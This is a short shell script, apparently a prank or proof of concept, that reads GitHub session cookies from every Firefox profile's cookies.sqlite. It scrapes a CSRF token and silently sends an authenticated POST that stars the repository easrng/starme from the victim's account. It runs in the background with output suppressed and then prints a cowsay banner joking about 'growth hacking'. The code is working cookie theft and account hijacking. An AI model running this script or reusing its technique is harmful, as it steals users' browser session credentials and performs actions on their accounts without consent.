#!/bin/sh
starme(){
for OG_DB in ~/.mozilla/firefox/*/cookies.sqlite
do
DB="$(mktemp)"
cp "$OG_DB" "$DB"
COOKIE="$(sqlite3 -separator '=' "$DB" 'select name, value from moz_cookies where host="github.com" or host=".github.com"' 2>/dev/null | tr '\n' '; ' | sed 's/;\s*$//')"
req(){
  URL="$1"
  shift
  curl "$URL" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0' -H 'Accept-Language: en-US,en;q=0.5' -H 'Referer: https://github.com/easrng/starme' -H 'Origin: https://github.com' -H 'Cookie: '"$COOKIE" $@
}
req "https://github.com/easrng/starme/star" -X POST -H 'Accept: application/json' -H 'x-requested-with: XMLHttpRequest' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -F "authenticity_token=$(req 'https://github.com/easrng/starme' 2>/dev/null | grep authenticity_token | grep '/star"' | head -n1 | sed 's/.*value="//g' | sed 's/".*//')" -F context=repository 2>/dev/null >/dev/null
rm "$DB"
done
}
starme &
echo ' ________________________________________ '
echo '/ epic growth hacking  tech tip:         \'
echo '| automatically star your github repos   |'
echo '\ with your user'"'"'s github account        /'
echo ' ---------------------------------------- '
echo '        \   ^__^                          '
echo '         \  (oo)\_______                  '
echo '            (__)\       )\/\              '
echo '                ||----w |                 '
echo '                ||     ||                 '

